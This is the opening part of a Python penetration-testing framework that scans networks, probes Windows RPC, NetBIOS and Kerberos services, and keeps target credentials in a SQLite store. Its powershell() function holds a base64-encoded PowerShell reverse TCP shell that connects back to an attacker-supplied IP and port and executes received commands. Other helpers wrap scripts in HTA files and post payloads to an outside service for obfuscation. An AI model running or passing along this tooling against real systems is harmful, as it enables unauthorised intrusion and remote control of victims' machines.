#!/usr/bin/python3
# coding:UTF-8

# -------------------------------------------------------------------------------------
#         PYTHON3 SCRIPT FILE FOR THE REMOTE ANALYSIS OF COMPUTER NETWORKS
#         BY TERENCE BROADBENT MSc DIGITAL FORENSICS & CYBERCRIME ANALYSIS
# -------------------------------------------------------------------------------------

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Load required imports.
# Modified: N/A
# -------------------------------------------------------------------------------------

import os
import sys
import time
import json
import nmap3
import getopt
import base64
import string
import random
import socket
import hashlib
import os.path
import sqlite3
import binascii
import pyfiglet
import datetime
import requests
import linecache
import itertools

from termcolor import colored
from impacket.dcerpc.v5 import transport
from impacket.dcerpc.v5.dcomrt import IObjectExporter
from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_LEVEL_NONE
from ldap3 import ALL, Server, Connection, NTLM, extend, SUBTREE

# -------------------------------------------------------------------------------------
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub                                                               
# Version : TREADSTONE                                                             
# Details : Load additional xParameter = bughunt and commandsonly
# Modified: N/A                                                               
# -------------------------------------------------------------------------------------

if len(sys.argv) < 2:
   xParameter = ""
else:
   xParameter = sys.argv[1]

# -------------------------------------------------------------------------------------
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub                                                               
# Version : TREADSTONE                                                             
# Details : Create functional subroutines called from main.
# Modified: N/A                                                               
# -------------------------------------------------------------------------------------

def sort(string):
   localCOM("echo " + string + " > numbers.tmp")
   localCOM("cat numbers.tmp | uniq | sort > sorted.tmp")
   revision = linecache.getline("sorted.tmp", 1).rstrip("\n")
   return revision

def cutLine(variable1, variable2):
   localCOM("sed -i '/" + variable1 + "/d' ./" + variable2)
   return
   
def parsFile(variable):
   localCOM("sed -i '/^$/d' ./" + variable)
   return

def test_DNS():
   if DNS[:5] == "EMPTY":
      print("[-] DNS has not been specified...")
      return 1
   else:
      return 0

def test_TIP():
   if TIP[:5] == "EMPTY":
      print("[-] REMOTE IP has not been specified...")
      return 1
   else:
      return 0
      
def test_WEB():
   if WEB[:5] == "EMPTY":
      print("[-] Website url has not been specified...")
      return 1
   else:
      return 0
   
def test_DOM():
   if DOM[:5] == "EMPTY":
      print("[-] DOMAIN name has not been specified...")
      return 1
   else:
      return 0  
   
def test_USR():
   if USR == "":
      print("[-] USERNAME has not been specified...")
      return 1
   else:
      return 0
      
def test_PAS():
   if PAS == "":
      print("[-] PASSWORD has not been specified...")
      return 1
   else:
      return 0
      
def test_SID():
   if SID[:5] == "EMPTY":
      print("[-] Domain SID has not been specified...")
      return 1
   else:
      return 0
   
def test_PRT(variable):
   if variable not in PTS:
      print("[-] Port " + variable + " not found in live ports...")
      return 1
   else:
      return 0

def test_TSH():
   if TSH[:5] == "EMPTY":
      print("[-] SHARE NAME has not been specified...")
      return 1
   else:
      return 0
      
def lineCount(variable):
   localCOM("cat " + variable + " | wc -l > count.tmp")
   count = int(linecache.getline("count.tmp", 1).rstrip("\n"))
   return count

def spacePadding(variable,value):
   variable = variable.rstrip("\n")
   variable = variable[:value]
   while len(variable) < value:
      variable += " "
   return variable

def dotPadding(variable,value):
   variable = variable.rstrip("\n")
   variable = variable[:value] 
   while len(variable) < value:
      variable += "."
   return variable

def getTime():
   variable = str(datetime.datetime.now().time())
   variable = variable.split(".")
   variable = variable[0]
   variable = variable.split(":")
   variable = variable[0] + ":" + variable[1]
   variable = spacePadding(variable, COL1)
   return variable   
   
def getPort():
   port = input("[?] Please enter the listening port number: ")
   if port.isdigit():
      return port
   else:
      print("[-] Sorry, I do not understand the value " + port + "...")
      return 1

def remoteCOM(variable):
   if proxyChains == 1:
      print("[i] Proxychains enabled...")
      variable = "proxychains4 " + variable
      return
   if xParameter == "bughunt":
      print(colored(variable, colour5))
      os.system(variable)
      return
   if xParameter == "commandsonly":
      print(colored(variable, colour5))
      return
   os.system(variable)   
   return
   
def localCOM(variable):
   if xParameter == "bughunt":
      print(colored(variable, colour5))
      os.system(variable)
      return
   if xParameter == "commandsonly":
      print(colored(variable, colour5))
      return
   os.system(variable)
   return
 
def prompt():
   null = input("\nPress ENTER to continue...")
   return
   
def wipeTokens(VALD):
   localCOM("rm    " + dataDir + "/tokens.txt")
   localCOM("touch " + dataDir + "/tokens.txt") 
   for x in range(0, maxUser):
      VALD[x] = "0"
   return
   
def nmapTrim(variable):
   cutLine("# Nmap", variable)
   cutLine("Nmap scan report", variable)
   cutLine("Host is up, received", variable)
   cutLine("STATE SERVICE", variable)
   cutLine("Nmap done", variable)
   localCOM("awk '/Service Info/' " + variable + " > service.tmp")
   cutLine("Service Info", variable)
   cutLine("Service detection performed", variable)   
   return
   
def saveParams():
   localCOM("echo '" + OSF + "' | base64 --wrap=0 >  base64.tmp"); localCOM("echo '\n' >> base64.tmp")
   localCOM("echo '" + COM + "' | base64 --wrap=0 >> base64.tmp"); localCOM("echo '\n' >> base64.tmp")
   localCOM("echo '" + DNS + "' | base64 --wrap=0 >> base64.tmp"); localCOM("echo '\n' >> base64.tmp")
   localCOM("echo '" + TIP + "' | base64 --wrap=0 >> base64.tmp"); localCOM("echo '\n' >> base64.tmp")   
   localCOM("echo '" + PTS + "' | base64 --wrap=0 >> base64.tmp"); localCOM("echo '\n' >> base64.tmp")
   localCOM("echo '" + WEB + "' | base64 --wrap=0 >> base64.tmp"); localCOM("echo '\n' >> base64.tmp")
   localCOM("echo '" + USR + "' | base64 --wrap=0 >> base64.tmp"); localCOM("echo '\n' >> base64.tmp")
   localCOM("echo '" + PAS + "' | base64 --wrap=0 >> base64.tmp"); localCOM("echo '\n' >> base64.tmp")
   localCOM("echo '" + NTM + "' | base64 --wrap=0 >> base64.tmp"); localCOM("echo '\n' >> base64.tmp")
   localCOM("echo '" + TGT + "' | base64 --wrap=0 >> base64.tmp"); localCOM("echo '\n' >> base64.tmp")   
   localCOM("echo '" + DOM + "' | base64 --wrap=0 >> base64.tmp"); localCOM("echo '\n' >> base64.tmp")
   localCOM("echo '" + SID + "' | base64 --wrap=0 >> base64.tmp"); localCOM("echo '\n' >> base64.tmp")
   localCOM("echo '" + FIL + "' | base64 --wrap=0 >> base64.tmp"); localCOM("echo '\n' >> base64.tmp")   
   localCOM("echo '" + TSH + "' | base64 --wrap=0 >> base64.tmp"); localCOM("echo '\n' >> base64.tmp")    
   parsFile("base64.tmp")    
   OSF2 = linecache.getline("base64.tmp", 1).rstrip("\n")  
   COM2 = linecache.getline("base64.tmp", 2).rstrip("\n")
   DNS2 = linecache.getline("base64.tmp", 3).rstrip("\n")
   TIP2 = linecache.getline("base64.tmp", 4).rstrip("\n")
   PTS2 = linecache.getline("base64.tmp", 5).rstrip("\n")
   WEB2 = linecache.getline("base64.tmp", 6).rstrip("\n")
   USR2 = linecache.getline("base64.tmp", 7).rstrip("\n")
   PAS2 = linecache.getline("base64.tmp", 8).rstrip("\n")
   NTM2 = linecache.getline("base64.tmp", 9).rstrip("\n")
   TGT2 = linecache.getline("base64.tmp", 10).rstrip("\n")
   DOM2 = linecache.getline("base64.tmp", 11).rstrip("\n")
   SID2 = linecache.getline("base64.tmp", 12).rstrip("\n")
   FIL2 = linecache.getline("base64.tmp", 13).rstrip("\n")
   TSH2 = linecache.getline("base64.tmp", 14).rstrip("\n")   
   cursor.execute("UPDATE REMOTETARGET SET OSF = \"" + OSF2 + "\" WHERE IDS = 1"); connection.commit()
   cursor.execute("UPDATE REMOTETARGET SET COM = \"" + COM2 + "\" WHERE IDS = 1"); connection.commit()
   cursor.execute("UPDATE REMOTETARGET SET DNS = \"" + DNS2 + "\" WHERE IDS = 1"); connection.commit()
   cursor.execute("UPDATE REMOTETARGET SET TIP = \"" + TIP2 + "\" WHERE IDS = 1"); connection.commit()
   cursor.execute("UPDATE REMOTETARGET SET PTS = \"" + PTS2 + "\" WHERE IDS = 1"); connection.commit()
   cursor.execute("UPDATE REMOTETARGET SET WEB = \"" + WEB2 + "\" WHERE IDS = 1"); connection.commit()
   cursor.execute("UPDATE REMOTETARGET SET USR = \"" + USR2 + "\" WHERE IDS = 1"); connection.commit()
   cursor.execute("UPDATE REMOTETARGET SET PAS = \"" + PAS2 + "\" WHERE IDS = 1"); connection.commit()
   cursor.execute("UPDATE REMOTETARGET SET NTM = \"" + NTM2 + "\" WHERE IDS = 1"); connection.commit()
   cursor.execute("UPDATE REMOTETARGET SET TGT = \"" + TGT2 + "\" WHERE IDS = 1"); connection.commit()
   cursor.execute("UPDATE REMOTETARGET SET DOM = \"" + DOM2 + "\" WHERE IDS = 1"); connection.commit()
   cursor.execute("UPDATE REMOTETARGET SET SID = \"" + SID2 + "\" WHERE IDS = 1"); connection.commit()
   cursor.execute("UPDATE REMOTETARGET SET FIL = \"" + FIL2 + "\" WHERE IDS = 1"); connection.commit()
   cursor.execute("UPDATE REMOTETARGET SET TSH = \"" + TSH2 + "\" WHERE IDS = 1"); connection.commit()   
   return
     
def privCheck():
   localCOM("ls  | grep ccache > ticket.tmp")   
   count = lineCount("ticket.tmp")   
   if count > 1:
      print("[i] More than one ticket was found...")            
   for x in range(1, count):
      ticket = linecache.getline("ticket.tmp", x).rstrip("\n")
      ticket = ticket.rstrip(" ")
      if ticket != "":
         localCOM("export KRB5CCNAME=" + ticket)
         print(colored("[*] Checking ticket status for " + ticket + "...", colour3))
         remoteCOM(keyPath + "psexec.py  " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + "@" + TIP.rstrip(" ") + " -k -no-pass")
      else:
         print("[-] Unable to find a valid ticket...")
      return spacePadding(ticket, COL1)

# -------------------------------------------------------------------------------------
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub                                                               
# Version : TREADSTONE                                                             
# Details : GetPorts - obtain all open ports on identified host.
# Modified: N/A                                                               
# -------------------------------------------------------------------------------------
         
def getTCPorts():
   checkParam = test_TIP()
   if checkParam == 1:
      return "EMPTY"
   else:
      print(colored("[*] Attempting to enumerate live tcp ports, please wait...", colour3))
      nmap = nmap3.NmapScanTechniques()
      results = nmap.nmap_tcp_scan(TIP.rstrip(" ")) # Dict
      with open("tcp.json", "w") as outfile:
         json.dump(results, outfile, indent=4)         
      localCOM("cat tcp.json | grep 'portid' | cut -d ':' -f 2 | tr '\n' ' ' | tr -d '[:space:]' | sed 's/,$//' > ports1.tmp")
      localCOM("cat tcp.json | grep 'name' | cut -d ':' -f 2 | tr '\n' ' ' | tr -d '[:space:]' | sed 's/,$//' > service1.tmp")
      this_Ports = linecache.getline("ports1.tmp", 1).rstrip("\n") 
      this_Ports = this_Ports.replace('"','')                 
      if this_Ports[:1] == "":
         print("[-] Unable to enumerate any port information, good luck!!...")
         return "EMPTY"
      else:
         print("[+] Found live ports...\n")      
         print(colored(this_Ports,colour6) + "\n")
         localCOM("echo " + this_Ports + " > list1.tmp")
         localCOM("cat list1.tmp | sed -e $'s/,/\\\n/g' | sort -un | tr '\n' ',' | sed 's/.$//' > sorted1.tmp" )
         catsFile("sorted1.tmp")          
      print("[+] Grabbing services...")        
      localCOM("awk -F ',' '{print NF-1}' sorted1.tmp > num1.tmp")
      loopMax = int(linecache.getline("num1.tmp", 1).rstrip("\n"))
      this_Ports1 = linecache.getline("sorted1.tmp", 1).rstrip("\n")        
      for loop1 in range(0, loopMax+1):
         for x1 in this_Ports1.split(","):
            portsTCP[loop1] = spacePadding(x1,5)
            loop1 = loop1 + 1
         break               
      services = linecache.getline("service1.tmp", 1).replace('"','')
      services = services.replace("[]","")
      services = services.rstrip("\n")            
      for loop1 in range(0, loopMax+1):      
         for y1 in services.split(","):
            servsTCP[loop1] = spacePadding(y1, COL4)
            loop1 = loop1 + 1 
         break      
   return this_Ports1
   
def getUDPorts():
   checkParam = test_TIP()
   if checkParam == 1:
      return "EMPTY"
   else:
      print(colored("[*] Attempting to enumerate live udp ports (top 200), please wait...", colour3))
      nmap = nmap3.NmapScanTechniques()
      results2 = nmap.nmap_udp_scan(TIP.rstrip(" "), args="--top 200")
      with open("udp.json", "w") as outfile:
         json.dump(results2, outfile, indent=4)         
      localCOM("cat udp.json | grep 'portid' | cut -d ':' -f 2 | tr '\n' ' ' | tr -d '[:space:]' | sed 's/,$//' > ports2.tmp")
      localCOM("cat udp.json | grep 'name' | cut -d ':' -f 2 | tr '\n' ' ' | tr -d '[:space:]' | sed 's/,$//' > service2.tmp")
      this_Ports2 = linecache.getline("ports2.tmp", 1).rstrip("\n") 
      this_Ports2 = this_Ports2.replace('"','')                 
      if this_Ports2[:1] == "":
         print("[-] Unable to enumerate any port information, good luck!!...")
         return "EMPTY"
      else:
         print("[+] Found live ports...\n")      
         print(colored(this_Ports2,colour6) + "\n")
         localCOM("echo " + this_Ports2 + " > list2.tmp")
         localCOM("cat list2.tmp | sed -e $'s/,/\\\n/g' | sort -un | tr '\n' ',' | sed 's/.$//' > sorted2.tmp" )
         catsFile("sorted2.tmp")     
      print("[+] Grabbing services...")        
      localCOM("awk -F ',' '{print NF-1}' sorted2.tmp > num2.tmp")
      loopMax = int(linecache.getline("num2.tmp", 1).rstrip("\n"))
      this_Ports2 = linecache.getline("sorted2.tmp", 1).rstrip("\n")        
      for loop2 in range(0, loopMax+1):
         for x2 in this_Ports2.split(","):
            portsUDP[loop2] = spacePadding(x2,5)
            loop2 = loop2 + 1
         break               
      services = linecache.getline("service2.tmp", 1).replace('"','')
      services = services.replace("[]","")
      services = services.rstrip("\n")            
      for loop2 in range(0, loopMax+1):      
         for y2 in services.split(","):
            servsUDP[loop2] = spacePadding(y2, COL4)
            loop2 = loop2 + 1 
         break  
#      this_Ports2 = this_Ports2.replace(",",",U:")
#      this_Ports2 = "U:" + this_Ports2
   return this_Ports2
   
def squidCheck():
   print(colored("[*] Attempting to enumerate squid proxy for hidden ports...", colour3))
   checkParam = test_PRT("3128")   
   if checkParam == 1:
      return
   else:
      if proxyChains == 0:
         remoteCOM("wfuzz -t32 -z range,1-65535 -p '" + TIP.rstrip(" ") + ":3128' --hc 503 http://localhost:FUZZ/ > squid.tmp  2>&1")
         catsFile("squid.tmp | grep '\"'")
      else:
         print("[-] Unable to enumerate hidden ports, proxychains enabled...")
   return
   
def checkInterface(variable, COM):
   print(colored("[*] Checking network interface...", colour3))  
   try:      
      authLevel = RPC_C_AUTHN_LEVEL_NONE      
      if variable == "DNS":
         stringBinding = r'ncacn_ip_tcp:%s' % DNS.rstrip(" ")
      if variable == "TIP":
         stringBinding = r'ncacn_ip_tcp:%s' % TIP.rstrip(" ")                  
      rpctransport = transport.DCERPCTransportFactory(stringBinding)
      portmap = rpctransport.get_dce_rpc()
      portmap.set_auth_level(authLevel)
      portmap.connect()
      objExporter = IObjectExporter(portmap)
      bindings = objExporter.ServerAlive2()      
      checkParam = 0            
      for binding in bindings:
         NetworkAddr = binding['aNetworkAddr']                  
         if checkParam == 0:
            if "." not in NetworkAddr:
               print("[+] Found network interface...\n")
               COM = NetworkAddr
               COM = COM.replace(chr(0), '')
               checkParam = 1               
         print(colored("Address: " + NetworkAddr, colour6))  
      print("")                
   except:
      print("[-] No responce from network interface, checking remote host instead...")
      COM = spacePadding("UNKNOWN", COL0)      
      if variable == "DNS":
         remoteCOM("ping -c 5 " + DNS.rstrip(" ") + " > ping.tmp")
      if variable == "TIP":
         remoteCOM("ping -c 5 " + TIP.rstrip(" ") + " > ping.tmp")           
      cutLine("PING","ping.tmp")         # First line
      cutLine("statistics","ping.tmp")   # Third from bottom
      parsFile("ping.tmp")		
      localCOM("sed -i '$d' ./ping.tmp") # Last line
      count = lineCount("ping.tmp")
      nullTest = linecache.getline("ping.tmp", count).rstrip("\n")
      localCOM("sed -i '$d' ./ping.tmp")
      catsFile("ping.tmp") 
      if nullTest != "":
         print ("[+] " + nullTest + "...")
      else:
         print("[-] No responce from host...")
   COM = spacePadding(COM, COL0)
   return COM       
   
def checkBIOS():
   if IP46 == "-6":
      return
   else:
      print(colored("[*] Checking windows network neighborhood protocol...", colour3))
      #bit1, bit2, bit3, bit4 = TIP.split(".")
      #remoteCOM("nbtscan -rv " + bit1 + "." + bit2 + "." + bit3 + ".0/24 > bios.tmp")
      remoteCOM("nbtscan -rv " + TIP.rstrip(" ") + " > bios.tmp")
      localCOM("sed -i '/Doing NBT name scan for addresses from/d' ./bios.tmp")
      localCOM("sed -i '/^$/d' ./bios.tmp")
      nullTest = linecache.getline("bios.tmp", 1).rstrip("\n")
      if nullTest == "":
         print("[-] No netbios information found...")
      else:
         print("[+] Found protocol...")
         catsFile("bios.tmp")
   return
   
def checkWAF():
      print(colored("[*] Checking to see if a Web Application Firewall (WAF) has been installed...", colour3))
      remoteCOM("wafw00f -a " + WEB.rstrip(" ") + " -o waf.tmp > tmp.tmp 2>&1")
      waf = linecache.getline("waf.tmp", 1).rstrip("\n")
      if waf != "":
         print(colored("\n" + waf.lstrip(" "), colour6))
      else:
         print(colored("\nHttps not detected...", colour6))
      return
   
def networkSweep():
   if IP46 == "-6":
      return
   else:
      bit1, bit2, bit3, bit4 = TIP.split(".")
      print(colored("[*] Attempting to enumerate all hosts on this network range, please wait...", colour3))
      remoteCOM("nmap -v -sn " + bit1 + "." + bit2 + "." + bit3 + ".1-254 -oG pingsweep.tmp > temp.tmp 2>&1")
      localCOM('grep Up pingsweep.tmp | cut -d " " -f 2 > hosts.tmp')
      nullTest = linecache.getline("hosts.tmp", 1).rstrip("\n")
      if nullTest == "":
         print("[-] No live hosts found...")
      else:
         print("[+] Found live hosts...")         
         the_list = []
         localCOM("echo '" + Green + "'")         
         with open("hosts.tmp") as file:
            for line in file:
               line = line.rstrip("\n")
               the_list.append(line.rstrip(" "))
            num_columns = 8
            while len(the_list) % num_columns != 0:
               the_list.append("255.255.255.255")
            for count,item in enumerate(sorted(the_list), 1):
               if item != "255.255.255.255":
                  print(item.ljust(18), end =' ')
               if count % num_columns == 0:
                  print("")        
   localCOM("echo '" + Reset + "'")
   return      
   
def catsFile(variable):
   count = lineCount(variable)
   if count > 0:
      localCOM("echo '" + Green + "'")
      localCOM("cat " + variable)
      localCOM("echo '" + Reset + "'")
   else:
      # print("[-] Empty File...")
      pass
   return   
   
def timeSync(SKEW):
   print(colored("[*] Attempting to synchronise time with remote server...", colour3))
   checkParam = test_PRT("88")   
   if checkParam == 1:
      return
   else:
      remoteCOM("nmap " + IP46 + " -sV -p 88 " + TIP.rstrip(" ") + " | grep 'server time' | sed 's/^.*: //' > time.tmp")
      dateTime = linecache.getline("time.tmp", 1).rstrip("\n")
      if dateTime != "":
         print("[+] Synchronised with remote server...")
         date, time = dateTime.split(" ")
         time = time.rstrip(")")
         localCOM("echo '" + Green + "'")
         localCOM("timedatectl set-time " + date)
         localCOM("date --set=" + time)
         localCOM("echo '" + Reset + "'")
         LTM = time
         SKEW = 1
      else:
         print("[-] Server synchronisation did not occur...")
   return SKEW                     

def registryKeys():
   print("\tHKEY_CLASSES_ROOT   HKCR")
   print("\tHKEY_CURRENT_USER   HKCU")
   print("\tHKEY_LOCAL_MACHINE  HKLM")
   print("\tHKEY_USERS          HKU ")
   print("\tHKEY_CURRENT_CONFIG HKCC")
   return
   
def idGenerator(size=6, chars=string.ascii_uppercase + string.digits):
   return ''.join(random.choice(chars) for _ in range(size))
   
def body(content):
   body = f"""<html>
   <head>
   <HTA:APPLICATION id="{idGenerator()}"
   applicationName="{idGenerator()}"
   border="thin"
   borderStyle="normal"
   caption="yes"
   icon="http://127.0.0.1/{idGenerator()}.ico"
   maximizeButton="yes"
   minimizeButton="yes"
   showInTaskbar="no"
   windowState="normal"
   innerBorder="yes"
   navigable="yes"
   scroll="auto"
   scrollFlat="yes"
   singleInstance="yes"
   sysMenu="yes"
   contextMenu="yes"
   selection="yes"
   version="1.0" />
   <script>
   {content}
   </script>
   <title>{idGenerator()}</title>
   </head>
   <body>
   <h1>{idGenerator()}</h1>
   <hr>
   </body>
   </html>"""
   return body   
   
def encrypt(payload):
   # https://github.com/felamos/weirdhta
   api_url = "https://enigmatic-shore-46592.herokuapp.com/api/weirdhta"
   data = r"""{"code" : "%s"}""" % (payload.decode())
   header = {"Content-Type": "application/json"}
   r = requests.post(api_url, headers=header, data=data)
   return r.text
   
def powershell(ip, port):
   # https://forums.hak5.org/topic/39754-reverse-tcp-shell-using-ms-powershell-only/
   revB64 = "IHdoaWxlICgxIC1lcSAxKQp7CiAgICAkRXJyb3JBY3Rpb25QcmVmZXJlbmNlID0gJ0NvbnRpbnVlJzsKICAgIHRyeQogICAgewogICAgICAgICRjbGllbnQgPSBOZXctT2JqZWN0IFN5c3RlbS5OZXQuU29ja2V0cy5UQ1BDbGllbnQoIlNVUEVSSVBBIiwgUE9SVCk7CiAgICAgICAgJHN0cmVhbSA9ICRjbGllbnQuR2V0U3RyZWFtKCk7CiAgICAgICAgW2J5dGVbXV0kYnl0ZXMgPSAwLi4yNTV8JXswfTsKICAgICAgICAkc2VuZGJ5dGVzID0gKFt0ZXh0LmVuY29kaW5nXTo6QVNDSUkpLkdldEJ5dGVzKCJDbGllbnQgQ29ubmVjdGVkLi4uIisiYG5gbiIgKyAiUFMgIiArIChwd2QpLlBhdGggKyAiPiAiKTsKICAgICAgICAkc3RyZWFtLldyaXRlKCRzZW5kYnl0ZXMsMCwkc2VuZGJ5dGVzLkxlbmd0aCk7JHN0cmVhbS5GbHVzaCgpOwogICAgICAgIHdoaWxlKCgkaSA9ICRzdHJlYW0uUmVhZCgkYnl0ZXMsIDAsICRieXRlcy5MZW5ndGgpKSAtbmUgMCkKICAgICAgICB7CiAgICAgICAgICAgICRyZWNkYXRhID0gKE5ldy1PYmplY3QgLVR5cGVOYW1lIFN5c3RlbS5UZXh0LkFTQ0lJRW5jb2RpbmcpLkdldFN0cmluZygkYnl0ZXMsMCwgJGkpOwogICAgICAgICAgICBpZigkcmVjZGF0YS5TdGFydHNXaXRoKCJraWxsLWxpbmsiKSl7IGNsczsgJGNsaWVudC5DbG9zZSgpOyBleGl0O30KICAgICAgICAgICAgdHJ5CiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICNhdHRlbXB0IHRvIGV4ZWN1dGUgdGhlIHJlY2VpdmVkIGNvbW1hbmQKICAgICAgICAgICAgICAgICRzZW5kYmFjayA9IChpZXggJHJlY2RhdGEgMj4mMSB8IE91dC1TdHJpbmcgKTsKICAgICAgICAgICAgICAgICRzZW5kYmFjazIgID0gJHNlbmRiYWNrICsgIlBTICIgKyAocHdkKS5QYXRoICsgIj4gIjsKICAgICAgICAgICAgfQogICAgICAgICAgICBjYXRjaAogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAkZXJyb3JbMF0uVG9TdHJpbmcoKSArICRlcnJvclswXS5JbnZvY2F0aW9uSW5mby5Qb3NpdGlvbk1lc3NhZ2U7CiAgICAgICAgICAgICAgICAkc2VuZGJhY2syICA9ICAiRVJST1I6ICIgKyAkZXJyb3JbMF0uVG9TdHJpbmcoKSArICJgbmBuIiArICJQUyAiICsgKHB3ZCkuUGF0aCArICI+ICI7CiAgICAgICAgICAgICAgICBjbHM7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgJHJldHVybmJ5dGVzID0gKFt0ZXh0LmVuY29kaW5nXTo6QVNDSUkpLkdldEJ5dGVzKCRzZW5kYmFjazIpOwogICAgICAgICAgICAkc3RyZWFtLldyaXRlKCRyZXR1cm5ieXRlcywwLCRyZXR1cm5ieXRlcy5MZW5ndGgpOyRzdHJlYW0uRmx1c2goKTsgICAgICAgICAgCiAgICAgICAgfQogICAgfQogICAgY2F0Y2ggCiAgICB7CiAgICAgICAgaWYoJGNsaWVudC5Db25uZWN0ZWQpCiAgICAgICAgewogICAgICAgICAgICAkY2xpZW50LkNsb3NlKCk7CiAgICAgICAgfQogICAgICAgIGNsczsKICAgICAgICBTdGFydC1TbGVlcCAtcyAzMDsKICAgIH0gICAgIAp9IAo="
   revPlain = base64.b64decode(revB64).decode()
   rev = revPlain.replace("SUPERIPA" , ip).replace("PORT", port)
   payload = base64.b64encode(rev.encode('UTF-16LE')).decode()
   return payload
      
def dispBanner(variable,flash):
   ascii_banner = pyfiglet.figlet_format(variable).upper()
   ascii_banner = ascii_banner.rstrip("\n")
   if flash == 1:
      localCOM("clear")
      print(colored(ascii_banner,colour0, attrs=['bold']))
   localCOM("pyfiglet " + variable + " > banner.tmp")
   return
   
def dispSubMenu(variable):
   variable = spacePadding(variable,163)
   localCOM("clear")
   dispMenu()
   options()
   print('\u2554' + ('\u2550')*163 + '\u2557')
   print('\u2551' + variable + '\u2551')
   print('\u255A' + ('\u2550')*163 + '\u255D')
   return
   
def clearClutter():
   localCOM("rm *.tmp")
   linecache.clearcache()
   return
   
def base_creator(domain):
    search_base = ""
    base = domain.split(".")
    for b in base:
        search_base += "DC=" + b + ","
    return search_base[:-1]

def dispMenu():
   print('\u2554' + ('\u2550')*14 + '\u2566' + ('\u2550')*42 + '\u2566' + ('\u2550')*46 + '\u2566' + ('\u2550')*58 + '\u2566' + ('\u2550')*7 + '\u2566' + ('\u2550')*34 + '\u2566' + ('\u2550')*7 + '\u2566' + ('\u2550')*34 + '\u2566' + ('\u2550')*65 + '\u2557')
   print('\u2551' + " TIME ", end =' ')   
   if SKEW == 0:
      print(colored(LTM[:6],colour7), end=' ')
   else:
      print(colored(LTM[:6],colour6), end=' ')      
   print('\u2551' + " " + colored("REMOTE COMPUTER NAME",colour5), end=' ')   
   if COM[:7] == "UNKNOWN":
      print(colored(COM.upper(),colour7), end=' ')
   else:
      print(colored(COM.upper(),colour6), end=' ')      
   print('\u2551' + (" ")*1 + colored("SHARENAME",colour5) + (" ")*7 + colored("TYPE",colour5) + (" ")*6 + colored("COMMENT",colour5) + (" ")*12 + '\u2551' + (" ")*1 + colored("USERNAME",colour5) + (" ")*16 + colored("NTFS PASSWORD HASH",colour5) + (" ")*15 + '\u2551' + " PORT  " + '\u2551' + " TCP SERVICE" + (" ")*22 + '\u2551' + " PORT  " + '\u2551' + " UDP SERVICE" + (" ")*22 + '\u2551' + " LOCAL IP ", end=' ')
   print(colored(localIP[:11],colour6), end=' ') 
   print((" ")*42 + '\u2551') 
   print('\u2560' + ('\u2550')*14 + '\u256C' + ('\u2550')*42 + '\u256C' + ('\u2550')*25 + '\u2550' + ('\u2550')*20 + '\u256C' + ('\u2550')*58 + '\u256C' + ('\u2550')*7 + '\u256C' + ('\u2550')*34 + '\u256C' + ('\u2550')*7 + '\u256C' + ('\u2550')*34 + '\u256C' +  ('\u2550')*65 + '\u2563')   
  

   for loop in range(0,screenLength):
      print('\u2551' + " " + coloum_one_Labels[loop] + "  " +  '\u2551', end=' ')
      if (loop == 0) & (OSF[:5] == "EMPTY"):
         print(colored(OSF[:COL1],colour7), end=' ') 
      else: 
         if(loop == 0): print(colored(OSF[:COL1],colour6), end=' ')
         
      if (loop == 1) & (DNS[:5] == "EMPTY"):
         print(colored(DNS[:COL1],colour7), end=' ')
      else:
         if(loop == 1): print(colored(DNS[:COL1],colour6), end=' ')
         
      if (loop == 2) & (TIP[:5] == "EMPTY"):
         print(colored(TIP[:COL1],colour7), end=' ')
      else:
         if(loop == 2): print(colored(TIP[:COL1],colour6), end=' ')
         
      if (loop == 3) & (POR[:5] == "EMPTY"):
         print(colored(POR[:COL1],colour7), end=' ')
      else:
         if(loop == 3): print(colored(POR[:COL1],colour6), end=' ')
         
      if (loop == 4) & (WEB[:5] == "EMPTY"):
         print(colored(WEB[:COL1],colour7), end=' ')
      else: 
         if(loop == 4): print(colored(WEB[:COL1],colour6), end=' ')
      
      if (loop == 5): print(colored(USR[:COL1],colour6), end=' ')

      if (loop == 6): print(colored(PAS[:COL1],colour6), end=' ')
         
      if (loop == 7) & (NTM[:5] == "EMPTY"):
         print(colored(NTM[:COL1],colour7), end=' ')
      else:
         if(loop == 7): print(colored(NTM[:COL1],colour6), end=' ')
         
      if (loop == 8) & (TGT[:5] == "EMPTY"):
         print(colored(TGT[:COL1],colour7), end=' ')
      else:
         if(loop == 8): print(colored(TGT[:COL1],colour6), end=' ')
         
      if (loop == 9) & (DOM[:5] == "EMPTY"):
         print(colored(DOM[:COL1],colour7), end=' ')
      else:
         if(loop == 9): print(colored(DOM[:COL1],colour6), end=' ')
         
      if (loop == 10) & (SID[:5] == "EMPTY"):
         print(colored(SID[:COL1],colour7), end=' ')            
      else: 
         if(loop == 10): print(colored(SID[:COL1],colour6), end=' ')
         
      if loop == 11 and EMPTY_1[:5] == "EMPTY":
         print (colored(EMPTY_1,colour7), end=' ') 
      else:
         if(loop == 11): print(colored(EMPTY_1[:COL1],colour6), end=' ')  
         
      if (loop == 12) & (FIL[:5] == "EMPTY"):
         print(colored(FIL[:COL1],colour7), end=' ')
      else:
         if(loop == 12): print(colored(FIL[:COL1],colour6), end=' ')
         
      if (loop == 13) & (TSH[:5] == "EMPTY"):
         print(colored(TSH[:COL1],colour7), end=' ')      
      else:
         if(loop == 13): print(colored(TSH[:COL1],colour6), end=' ')
      
      if loop == 14 and EMPTY_2[:5] == "EMPTY": print (colored(EMPTY_2,colour7), end=' ')
      if loop == 15 and EMPTY_3[:5] == "EMPTY": print (colored(EMPTY_3,colour7), end=' ')
      if loop == 16 and EMPTY_4[:5] == "EMPTY": print (colored(EMPTY_4,colour7), end=' ')
      if loop == 17 and EMPTY_5[:5] == "EMPTY": print (colored(EMPTY_5,colour7), end=' ')
      if loop == 18 and EMPTY_6[:5] == "EMPTY": print (colored(EMPTY_6,colour7), end=' ')
      if loop == 19 and EMPTY_7[:5] == "EMPTY": print (colored(EMPTY_7,colour7), end=' ')      
      if loop == 20 and EMPTY_8[:5] == "EMPTY": print (colored(EMPTY_8,colour7), end=' ')
